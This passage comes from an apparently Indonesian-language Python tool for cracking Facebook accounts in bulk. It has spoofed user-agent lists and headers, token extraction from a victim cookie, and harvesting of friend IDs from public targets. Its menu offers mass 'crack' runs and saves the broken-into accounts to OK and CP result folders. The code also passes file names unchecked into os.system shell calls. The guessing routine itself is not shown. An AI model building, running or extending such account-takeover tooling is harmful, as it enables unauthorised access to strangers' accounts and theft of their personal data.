5.0.2; SAMSUNG SM-G530F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Max Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 UCBrowser/11.5.2.1188 (UCMini) Mobile','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36','Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54','Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36[FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]','Mozilla/5.0 (Linux; Android 9; LT-NOTE 10S Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.115 Mobile Safari/537.36 UCBrowser/11.4.1.1138 (UCMini) Mobile','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF','Mozilla/5.0 (Linux; Android 9; Star) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54','Mozilla/5.0 (Linux; Android 9; Mi Note 10 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45','Mozilla/5.0 (Series40; NokiaC2-02/07.65; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27','Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0','Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977','NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone  OS 7.5; Trident/5.0; IEMobile/9.0','Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF','Mozilla/5.0 (Linux; Android 4.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/E7FBAF','Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4','Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1','Nokia5800/20.0.002 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413','Mozilla/5.0 (Linux; Android 10; CDY-NX9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; EVR-L29 Build/HUAWEIEVR-L29; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; LYA-AL00 Build/HUAWEILYA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1; EML-L29 Build/HUAWEIEML-L29; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1; CLT-L29 Build/HUAWEICLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36'])

def convert_cookie(cok):
	return ( ";".join([str(i[0])+'='+str(i[1]) for i in cok.items()]) )

def header_get():
	return {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def header_post():
	return {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def header_mbasic():
	return {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def header_post_mbasic():
	return {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def header_get_free():
	return {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}

def header_post_free():
	return {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}



# BANNER
P = '\033[0;00m'
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;35m'
K ='\033[0;33m'
#P='\033[0;37m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
I='\033[0;32m'
II='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
b = '\033[38;2;255;127;0;1m' #ORANGE
x = '\033[0;36m'
war = "[•]"
B = '\033[0;36m'



def clear():
	os.system('clear')
# BACK

def back():
	login()
# BANNER
def banner():
	clear()
	xq = random.choice([U,B,b,K,M,I])
	print(f"""
{P}[•]{B}-----------------------------------------------------------{P}[•]
{B} |{xq}           __________  ___   ________ __ __________          {B}|
{B} |{xq}          / ____/ __ \/   | / ____/ //_// ____/ __ \\        {B}|
{B} |{xq}         / /   / /_/ / /| |/ /   / ,<  / __/ / /_/ /         {B}|
{B} |{xq}        / /___/ _, _/ ___ / /___/ /| |/ /___/ _, _/          {B}|
{B} |{xq}        \____/_/ |_/_/  |_\____/_/ |_/_____/_/ |_\\          {B}|
{B} |{xq}                                                             {P}|
{P}[•]{B}-----------------------------------------------------------{P}[•]
{B} |
{B} |
{B} |""")

def login():
	try:
		token = open('token.txt','r').read()
		tokenku.append(token)
		try:
			iya_dek = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
			menu()
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			banner()
			print(f"{P}[•] {M}Koneksi internet bermasalah, priksa & coba lagi")
			exit()
	except IOError:
		login_lagi()
def login_lagi():
	banner()
	print(f"{P}[•] Pilih method login anda ")
	print(f"{P}[•] Pastikan akun tumball anda bersifat publik ygy harus nama")
	print(f"{P}[•] Jangan bersivat id maseh")
	print(f"{B} | ")
	print(f"""{P}
[1] Login menggunakan token facebook
[2] Login menggubakan cookie facebook{m} Eror""")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	gg_re = input(f"{P}[•] Input : {B}")
	if gg_re in ['1','01']:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		panda = input(f"{P}[•] Masukan token : {B}")
		akun=open('token.txt','w').write(panda)
		try:
			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
			tes3 = json.loads(tes.text)['id']
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {I}Login menggunakan token berhasill")
			time.sleep(2.5)
			menu()
		except KeyError:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {M}Login menggunakan token gagal")
			time.sleep(2.5)
			login_lagi()
		except requests.exceptions.ConnectionError:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•]{M} Koneksi modar anjink")
			exit()
	elif gg_re in ['2','02']:
		try:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			cookie = input(f"{P}[•] Masukan cookie : {B}")
			data = requests.get('https://business.facebook.com/business_locations', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'referer': 'https://www.facebook.com/', 'host': 'business.facebook.com', 'origin': 'https://business.facebook.com', 'upgrade-insecure-requests': '1', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8', 'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
			find_token = re.search('(EAAG\\w+)', data.text)
			ken = open('token.txt','w').write(find_token.group(1))
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {I}Login berhasill ngab silahkan anda bersenang-senang")
			menu()
		except Exception as e:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•]{M} Login gagal anjink")
			login_lagi()
			
# MENU
def menu():
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		_gep = requests.get('http://ipinfo.io/json').json()
		token = open('.token.txt','r').read()
		t.append(token)
		cek_tk = requests.get('https://graph.facebook.com/me?access_token='+t[0])
		re_nama = json.loads(cek_tk.text)['name']
		re_id = json.loads(cek_tk.text)['id']
		re_ttl = json.loads(cek_tk.text)['birthday']
	except:cek_tk = {'-'}
	try:print(f"{P}[•] Username           : {I}{str(re_nama)}")
	except:re_nama = '-'
	try:print(f"{P}[•] Userid             : {I}{str(re_id)}")
	except:re_id = '-'
	try:print(f"{P}[•] Tanggal lahir      : {I}{str(re_ttl)}")
	except:re_ttl = '-'
	banner()
	print(f"""{B} |-------------------------------------------->{P}INFO AKUN
{B} |
{B} |
{B} |
{P}[•] Username          :      {B}{str(re_nama)}
{P}[•] Userid            :      {B}{str(re_id)}
{B} |
{B} |
{B} |
{B} |-------------------------------------------->{P}INFO DEVICE
{B} |
{B} |
{B} |
{P}[•] Alamat ipaddres    :     {B}{_gep['ip']}
{P}[•] Region             :     {B}{_gep['region']}
{P}[•] Informasi kuota    :     {B}{_gep['org']}
{P}[•] Time zone          :     {B}{_gep['timezone']}
{P}[•] Country            :     {B}{_gep['city']}
{B} |
{B} |
{B} |
{B} |-------------------------------------------->{P}MENU TOOLS
{B} |
{B} |
{B} |
{P}[1] Crack dari id publik massall old
{P}[2] Crack dari id followers publik massall old
{P}[3] Crack dari id pertemanan dan publik massall
{P}[4] Crack dari id followers publik massall
{P}[5] Crack dari id like postingan massall
{P}[6] Crack dari id publik
{P}[7] Crack dari id followers publik
{P}[8] Crack dari id anggota member group
{P}[9] Crack dari id pencarian nama
{P}[10] Crack dari id bagikan postingan
{P}[11] Crack dari id teman yang di sarankan
{P}[12] Crack dari id pesan
{P}[13] Crack dari id komentar postingan
{P}[14] Crack dari id file
{P}[15] Cari target untuk di crack
{P}[16] Chek results crack
{P}[17] Chek opsi accounts chekpoints
{P}[18] Exit
{P}[00] Logout
{B} |
{B} |
{B} |""")
	jmbf = input(f"{P}[•] Input : {B}")
	if jmbf in ['1','01']:
		oldpublik()
	elif jmbf in ['2','02']:
		oldfollow()
	elif jmbf in ['3','03']:
		dump_massal()
	elif jmbf in ['4','04']:
		dump_follower_massal()
	elif jmbf in ['5','05']:
		share()
	elif jmbf in ['6','06']:
		dump_publik()
	elif jmbf in ['7','07']:
		dump_follower()
	elif jmbf in ['8','08']:
		grup()
	elif jmbf in ['9','09']:
		nama()
	elif jmbf in ['10']:
		likes()
	elif jmbf in ['11']:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Menu belum tersedia");exit()
	elif jmbf in ['12']:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Menu belum tersedia");exit()
	elif jmbf in ['13']:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Menu belum tersedia");exit()
	elif jmbf in ['14']:
		share()
	elif jmbf in ['15']:
		ambilid()
	elif jmbf in ['16']:
		result()
	elif jmbf in ['17']:
		file()
	elif jmbf in ['18']:
		os.system("git pull")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Tools berhasil di perbarui");exit()
	elif jmbf in ['00']:
		os.system("rm -rf token.txt")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Berhasil di hapus");exit()
	else:
		print(f"{B} | ")
		print(f"{B} | ");time.sleep(0.25)
		print(f"{B} | ")
		print(f"{P}[•] Pilihan salah");menu()
		
def target():
	print('[!] Wait');time.sleep(3)
	input('>>> Enter ')
	os.system('am start https://wa.me/+6281267806733?text=Assalamualaikum,+Bang+Dicky,+Saya+Ingin+Beli+File+%20>/dev/null')
	exit('Selamat Tinggal')
# RESULT CHECKER
def result():
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Cek results crack")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[1] Cek hasil cp")
	print(f"{P}[2] Cek hasil ok")
	print(f"{P}[0] Kembali ke menu")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	kz = input(f"{P}[•] Pilih : {B}")
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {M}File tidak di temukan ")
			back()
		if len(vin)==0:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {M}Anda belum memiliki results cp")
			time.sleep(2)
			back()
		else:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] Hasil cp anda")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---------> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---------> '+str(len(hem))+' Akun'+x)
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] Pilih results untuk di tampilkan")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			geeh = input(f"{P}[•] Pilih : {B}")
			try:geh = lol[geeh]
			except KeyError:
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{P}[•] Pilihan tidak ada di menu")
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{P}[•] {M}FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI")
				time.sleep(2)
				back()
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] List akun cp anda")
			hus = os.system('cd CP && cat '+geh)
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			input(f"{P}[•] Kembali")
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {M}File tidak di temukan anjink")
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {M}Anda belum memiliki results ok")
			time.sleep(2)
			back()
		else:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] Hasil ok anda")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ----------> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---------> '+str(len(hem))+' Akun'+x)
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] Pilih results untuk di tampilkan")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			geeh = input(f"{P}[•] Pilih : {B}")
			try:geh = lol[geeh]
			except KeyError:
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{P}[•] Pilihan tidak ada di menu")
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{P}[•] File tidak ditemukan ")
				time.sleep(2)
				back()
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] List akun ok anda")
			hus = os.system('cd OK && cat '+geh)
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			input(f"{P}[•] Kembali")
			back()
	elif kz in ['0','00']:
		back()
	else:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Pilihan tidak ada di menu")
		exit()

# OPEN
def file():
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Cek opsi dari file")
	print(f"{P}[•] Sedang Membaca File, Tunggu Sebentar ...")
	time.sleep(2)
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pilih file yang akan di cek")
	my_files = []
	try:
		lis = os.listdir('CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•]{M} Anda belum memiliki results untuk dicek")
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' ----------> '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' ---------> '+str(len(hem))+' Akun'+x)
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Pilih yang akan di cek")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		geeh = input(f"{P}[•] Pilih : {B}")
		try:geh = lol[geeh]
		except KeyError:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•]{M} Pilihan tidak ada di menu")
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{B} | ")
				print(f"{P}[•]{M} File tidak di temukan ")
				time.sleep(2)
				back()

# DUMP ID PUBLIK
def dump_publik():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan akun yang ingin di dump bersifat publik")
	print(f"{P}[•] Ketikan {B}me{P} jika ingin dump id dari pertemanan sendiri")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	pil = input(f"{P}[•] Userid target : {B}")
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Info target ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Username : {I}{str(grex)}")
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•]{M} Id tidak ditemukan")
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Koneksi bermasalah priksa & coba lagi")
		exit()
	try:
		po = requests.get(f'https://graph.facebook.com/{pil}?fields=name,friends.fields(id,name).limit(50000)&access_token={token}').json()
		for i in po['friends']['data']:
			id.append(f"{i['id']}|{i['name']}")
			rq = random.choice(["😡","😰","😭","😇","😅","😎"])
			print(f"\r{P}[•] {B}++++++++++++> {I}{len(id)}",end="")
#			print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Total pengumpulan : {I}{len(id)}")
		
		proses_crackkk()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Koneksi internet jelek")
		exit()
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Pertemanan tidak publik atau token modar")
		exit()
def old_publik():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] {M}Pastikan target bersifat publik")
	print(f"{P}[•] Pastikan akun yang ingin di dump bersifat publik")
